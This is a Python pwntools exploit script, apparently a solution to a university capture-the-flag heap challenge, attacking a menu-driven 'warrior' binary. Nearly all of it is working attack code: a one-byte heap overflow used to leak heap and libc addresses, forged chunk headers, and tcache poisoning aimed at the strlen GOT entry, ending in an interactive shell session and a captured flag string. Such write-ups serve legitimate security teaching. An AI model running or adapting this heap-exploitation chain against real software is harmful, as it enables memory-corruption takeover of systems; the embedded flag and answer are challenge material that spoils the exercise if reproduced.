from pwn import *
import string
from sys import argv
import os
import time
import subprocess
import struct

context.arch = 'amd64'
context.os = 'linux'
info = log.info
context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file /gdbscript/vuln
#b *rename_warrior+78
#b *free
#b *read_line+57
#b *inspect_warrior+76
b *_int_free+493
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
#p = remote('tasks.ws24.softsec.rub.de', 32852)

p=remote("127.0.0.1", 1025)
p2=process('tmux split-window -h docker exec -ti $(docker ps -q -f "ancestor=softsec/ragnarok") /bin/sh -c \'gdb -x /gdbscript/gdbscript -p $(pgrep -n vuln)\'', shell=True)
sleep(4)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)


def create_warrior(size, name):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Enter size: ", f"{size}".encode())
    p.sendlineafter(b"Enter name: ", name)


def inspect_warrior(size, name_part):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Enter part of the name: ", name_part)
    p.sendlineafter(b"Enter size: ", f"{size}".encode())
    p.recvuntil(b"Warrior ")
    name_and_leak = p.recv(numb=size)
    print(name_and_leak)
    p.recvuntil(b" is currently at position ")
    index = int(p.recvline())
    return name_and_leak, index


def rename_warrior(name_part, new_name):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Enter part of the name: ", name_part)
    p.sendafter(b"Enter new name: ", new_name)


def delete_warrior(name_part):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"Enter part of the name: ", name_part)
    # double free?
    # some strange array entry swapping


def end():
    p.sendlineafter(b"> ", b"5")



create_warrior(0x80, b"A"*0x7F)
create_warrior(0x80, b"V"*0x7F)
delete_warrior(b"V")
# one-byte overflow POC
rename_warrior(b"A"*0x7F, b"B"*0x80)
rename_warrior(b"B"*0x80, b"C"*0x81)
rename_warrior(b"C"*0x81, b"D"*0x82)

heap_leak = int(inspect_warrior(0x200, b"D"*0x82)[0][144:144+6][::-1].hex(), 16) << 12
print("heap leak: ", hex(heap_leak))








# fill tcache for size 0x110
for i in range(18):
    create_warrior(0x108, f"{chr(ord('F')+i)}".encode()*0x107)

for i in range(16):
    if i % 2 == 0:
        delete_warrior(f"{chr(ord('F')+i)}".encode())



libc_leak = int(inspect_warrior(0x200, b"S"*0x82)[0][272:272+6][::-1].hex(), 16)

print("libc leak: ", hex(libc_leak))


libc_base = libc_leak - 0x1d2cc0

# see moodle
strlen_got_addr = libc_base + 0x1d2080



# we have 2 chunks allocated right after each other
# we have a 1 byte overflow that we use to flip the prev in use flag on the second chunk by writing stuff in the first chunk
# the the prev size in the second chunk belongs to the data of the first chunk
# so we can directly write ptr + 1 byte overflow to set prev in use to false (0) and can then free the second chunk to create a freelist entry with arbitrary address


#create_warrior(0x100, b"Y"*0xFF)
#create_warrior(0x108, b"Z"*0x107)

# Z is at heap_leak+0xe50
# Q is at heap_leak+0xf60


input("magic")


rename_warrior(b"V"*0x107, b"V"*0x108)
rename_warrior(b"V"*0x108, b"V"*0x109)



# at heap_leak+0x290 we have the entry filled with "D"
fake_size = (heap_leak+0x15c0) - (heap_leak+0x290+0x10)
payload = b"Z"*0x100 + struct.pack('<q', fake_size) + p8(0x10) + p8(0x01)

rename_warrior(b"V"*0x109, payload)

# must not go into tcache for merge to happen ;_;


# has to match fake prev size value from above
#           dunno |              size            |         fd           | bk
payload2 = p64(0) + struct.pack('<q', fake_size) + p64(heap_leak+0x290+0x10) * 4
memory_backup = inspect_warrior(0x3F0, b"D"*0x82)[0]
rename_warrior(b"D"*0x82, payload2+b"D"*(0x83-0x30))

# new address must be within controlled memory
# we spoof a free list entry within allocated memory
# we use that fake block's next pointer to actually create
# a new block on the got afterwards


# write into heap_leak+0x14c0 the fake chunk so fake prev size is quite small???
# thats the same chunk used to overwrite a prev in use field


print("fake size: ", hex(fake_size))
input("magic")
delete_warrior(b"W"*0x107)

create_warrior(0x120, b";"*(0x120-1))


def  PROTECT_PTR(pos, ptr):
    return (((pos) >> 12) ^ (ptr))


# I can now write from heap_leak+0x290+0x10 to heap_leak+0x320, which is a tcache entry
# there we write:
#        padding till tcache entry | prev size |    size    |         fd           | whatever
payload3 = b";"*(0x320-0x290-0x20) +   p64(0)  + p64(0x110) + p64(PROTECT_PTR(heap_leak, strlen_got_addr)) + memory_backup[0x20+(0x320-0x290-0x20)+8+8+8:]

print("payload3: ", payload3[:0x120])
rename_warrior(b";"*(0x120-1), payload3[:0x120])


p.interactive()

#softsec{oE3YfxDJcdu1QEZjujudSs5fg0w6jAw8ZM9zok8-ILIcAsQvYMFDXhg6RrgF7_g0}